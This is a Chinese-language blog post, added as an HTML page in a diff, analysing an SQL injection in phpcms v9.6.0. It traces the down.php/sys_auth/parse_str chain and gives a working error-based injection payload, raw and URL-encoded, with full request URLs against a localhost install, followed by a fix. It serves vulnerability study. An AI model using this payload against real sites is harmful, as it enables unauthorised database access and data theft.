@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="phpcms_v9.6.0SQL注入漏洞分析"/>
+
+
+
+
+  <meta name="keywords" content="php代码审计," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2019/11/08/phpcms-v9-6-0SQL注入漏洞分析/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcms_v9.6.0SQL注入漏洞分析">
+<meta property="og:url" content="https://glotozz.github.io/2019/11/08/phpcms-v9-6-0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/RcfNwHqeiWBxaKA.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/zHQRZgBpMlDvrWq.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/PYRpdMzCug4WkiF.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/tXOqfzW9dVxSIK6.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/fa1JXRgbxsOTonj.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/G12kbSKwLigVd7n.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/YETjRhFyU7DkgQv.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/jcnBsYNTuiHUEqo.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/RtwGiAbIm3HeqOT.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/lc49y27MDCoP3gB.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/eULwBPcKpORuksY.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/GTCguv5jXLEd8AR.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/7mCfuraV6JzlHQF.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/08/pRrQDX3tlLiqb9v.png">
+<meta property="article:published_time" content="2019-11-07T23:30:10.000Z">
+<meta property="article:modified_time" content="2020-03-28T01:06:49.696Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/08/RcfNwHqeiWBxaKA.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> phpcms_v9.6.0SQL注入漏洞分析 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          phpcms_v9.6.0SQL注入漏洞分析
+        
+      </h1>
+
+      <time class="post-time">
+          Nov 08 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#一-获取漏洞">一、获取漏洞</a></li>
+<li><a href="#二-漏洞实现">二、漏洞实现</a></li>
+<li><a href="#三-漏洞分析">三、漏洞分析</a></li>
+<li><a href="#四-修复方案">四、修复方案</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<h4><span id="一-获取漏洞">一、获取漏洞</span></h4><p><code>phpcms_v9.6.0_UTF8</code></p>
+<blockquote>
+<p>下载链接：<a href="http://download.phpcms.cn/v9/9.6/" target="_blank" rel="noopener">http://download.phpcms.cn/v9/9.6/</a> </p>
+</blockquote>
+<h4><span id="二-漏洞实现">二、漏洞实现</span></h4><p>参考漏洞分析最后一步，偷懒</p>
+<h4><span id="三-漏洞分析">三、漏洞分析</span></h4><p>起点在<code>phpcms/modules/content/down.php</code>中，</p>
+<p><img src="https://i.loli.net/2019/11/08/RcfNwHqeiWBxaKA.png" alt="Snipaste_2019-11-08_08-32-32.png"></p>
+<p>我们可控<code>$a_k</code>，跟踪<code>sys_auth()</code>这个解码函数</p>
+<p><img src="https://i.loli.net/2019/11/08/zHQRZgBpMlDvrWq.png" alt="Snipaste_2019-11-08_08-35-40.png"></p>
+<p>太长了，打扰了，考虑伪造，追踪<code>parse_str()</code>,</p>
+<p><img src="https://i.loli.net/2019/11/08/PYRpdMzCug4WkiF.png" alt="Snipaste_2019-11-08_08-38-56.png"></p>
+<p>内置函数<code>parse_str()</code>会自动进行<code>urldecode()</code>以及存在变量覆盖漏洞</p>
+<p>继续往下看，存在sql查询语句,也就是我们可以搞事情的地方</p>
+<p><img src="https://i.loli.net/2019/11/08/tXOqfzW9dVxSIK6.png" alt="Snipaste_2019-11-08_08-41-31.png"></p>
+<p>那么考虑如何伪造，与之前<code>dedecms漏洞复现-2</code>中的前台任意用户登录有些相似之处</p>
+<blockquote>
+<p>判断cookie中的<code>DeDeUserID_ckMd5</code>与<code>md5($cfg_cookie_encode.$_COOKIE[$key])</code>的前16位比较是否相等，只要过了这个判断就没啥问题了。我们可以利用任意用户的一组来绕过  </p>
+</blockquote>
+<p>当时是寻找<code>PutCookie()</code>，所以这里我们直接全局搜索<code>sys_auth(</code>，寻找调用<code>sys_auth()</code>方法中的<code>&#39;ENCODE&#39;</code>，且第一个变量我们要可控</p>
+<p><code>phpcms/libs/classes/param.class.php</code>（这些利用点的寻找需要耐心）</p>
+<p><img src="https://i.loli.net/2019/11/08/fa1JXRgbxsOTonj.png" alt="Snipaste_2019-11-08_09-01-28.png"></p>
+<p>全局搜索调用这个<code>set_cookie()</code>类方法的地方，有很多，随便选一个</p>
+<p><code>phpcms/modules/member/index.php</code></p>
+<p><img src="https://i.loli.net/2019/11/08/G12kbSKwLigVd7n.png" alt="Snipaste_2019-11-08_09-11-05.png"></p>
+<p>经过一次<code>safe_replace()</code>，可以看一下，但是因为我们可以二次<code>urlencode()</code>编码，目测问题不大</p>
+<p><img src="https://i.loli.net/2019/11/08/YETjRhFyU7DkgQv.png" alt="Snipaste_2019-11-08_09-13-59.png"></p>
+<p>这里的单引号过滤我们可以利用最后一个替换为空来绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2\7</span><br></pre></td></tr></table></figure>
+
+<p>构造payload，调试下，发现在下面断了</p>
+<p><img src="https://i.loli.net/2019/11/08/jcnBsYNTuiHUEqo.png" alt="Snipaste_2019-11-08_09-33-32.png"></p>
+<p>这里的<code>$nickname</code>存在正则匹配，打扰了，继续寻找调用<code>set_cookie()</code></p>
+<p><code>phpcms/modules/attachment/attachments.php</code></p>
+<p><img src="https://i.loli.net/2019/11/08/RtwGiAbIm3HeqOT.png" alt="Snipaste_2019-11-08_09-43-47.png"></p>
+<p>将<code>$arr</code>转化成json数组，考虑<code>$src</code>，追踪调用这个方法的地方</p>
+<p><img src="https://i.loli.net/2019/11/08/lc49y27MDCoP3gB.png" alt="Snipaste_2019-11-08_09-50-23.png"></p>
+<p>这里<code>$filepath</code>似乎不可控。。。</p>
+<p>继续追踪，同个文件中</p>
+<p><img src="https://i.loli.net/2019/11/08/eULwBPcKpORuksY.png" alt="Snipaste_2019-11-08_09-53-58.png"></p>
+<p>舒服了。。搜索调用这个方法的地方，没有搜索到调用这个方法的，js中存在ajax告诉我们直接调用即可。。。</p>
+<p><strong>所以以后还是先把每个函数先看看一看再说，如果我之前看到了这个肯定就先对这个进行探索</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.get(&#39;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;&#39;+id+&#39;&amp;src&#x3D;&#39;+src+&#39;&amp;filename&#x3D;&#39;+filename);</span><br></pre></td></tr></table></figure>
+
+<p>那么直接构造payload（需要用户登录状态）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;f&#x3D;1&amp;id&#x3D;%2\7 and extractvalue(1,concat(0x7e,database(),0x7e))#</span><br><span class="line"></span><br><span class="line">%6D%3D%31%26%6D%6F%64%65%6C%69%64%3D%31%26%63%61%74%69%64%3D%31%26%66%3D%31%26%69%64%3D%25%32%5C%37%20%61%6E%64%20%65%78%74%72%61%63%74%76%61%6C%75%65%28%31%2C%63%6F%6E%63%61%74%28%30%78%37%65%2C%64%61%74%61%62%61%73%65%28%29%2C%30%78%37%65%29%29%23</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;phpcms_v9.6.0&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;filename&#x3D;&amp;src&#x3D;%6D%3D%31%26%6D%6F%64%65%6C%69%64%3D%31%26%63%61%74%69%64%3D%31%26%66%3D%31%26%69%64%3D%25%32%5C%37%20%61%6E%64%20%65%78%74%72%61%63%74%76%61%6C%75%65%28%31%2C%63%6F%6E%63%61%74%28%30%78%37%65%2C%64%61%74%61%62%61%73%65%28%29%2C%30%78%37%65%29%29%23</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GumfD_att_json&#x3D;0563E8s0JwxyefMwawZd9Chec7blhnAz-65r2rq46K-Q2hJdDjyAzNBVEH7GMJJEvYy9_D6rShNX7_Nffssd2YddtC4NMPYFmlfKaRo8kvuoLPjq2ktiJQt4M2KeSzl8pwcB1gZ70US1ITwn1VArlxgptns0RA-LFoIkwomQFVrW2HUAXbPzAtBNWa_hfGM</span><br></pre></td></tr></table></figure>
+
+<p>再去<code>down.php</code>想办法调用</p>
+<p>访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;phpcms_v9.6.0&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;0563E8s0JwxyefMwawZd9Chec7blhnAz-65r2rq46K-Q2hJdDjyAzNBVEH7GMJJEvYy9_D6rShNX7_Nffssd2YddtC4NMPYFmlfKaRo8kvuoLPjq2ktiJQt4M2KeSzl8pwcB1gZ70US1ITwn1VArlxgptns0RA-LFoIkwomQFVrW2HUAXbPzAtBNWa_hfGM</span><br></pre></td></tr></table></figure>
+
+<p>提示<strong>参数错误</strong>，？？？？不应该啊</p>
+<p>看了下力哥的，唯一的差别是传<code>src=</code>时<code>m=1</code>前多个<code>&amp;</code>，我加上后试了下果然可以</p>
+<p><strong>这里是个trick</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a_k &#x3D; &#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;m&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;f&#x3D;1&amp;id&#x3D;%27 and extractvalue(1,concat(0x7e,database(),0x7e))#&quot;,&quot;filename&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/08/GTCguv5jXLEd8AR.png" alt="Snipaste_2019-11-08_12-38-41.png"></p>
+<p>如果不加<code>&amp;</code>，打印变量</p>
+<p><img src="https://i.loli.net/2019/11/08/7mCfuraV6JzlHQF.png" alt="Snipaste_2019-11-08_12-41-08.png"></p>
+<p><strong>那么真相大白，其实&amp;相当于分隔符，感觉这里的<code>parse_str()</code>用的挺奇怪的</strong></p>
+<p>加上<code>&amp;</code>后成功</p>
+<p><img src="https://i.loli.net/2019/11/08/pRrQDX3tlLiqb9v.png" alt="Snipaste_2019-11-08_12-00-28.png"></p>
+<p>虽然mysql报错了，但是这里报错的原因是我的mysql版本为<code>5.0.96</code>，而<code>5.1.5</code>以上才支持这个函数，但是sql语句是没问题的，盲注也可以</p>
+<h4><span id="四-修复方案">四、修复方案</span></h4><p>对sql查询的<code>$id</code>进行<code>intval()</code>过滤</p>
+<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://zhzhdoai.github.io/2019/10/11/历史漏洞分析之PHPCMS-v9-6-0-SQL注入/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/11/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-SQL%E6%B3%A8%E5%85%A5/</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> php代码审计</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/11/18/Typecho-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">Typecho-反序列化漏洞分析</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/11/07/phpcms-v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <span class="next-text nav-default">phpcms_v9.6.0任意文件上传漏洞分析</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
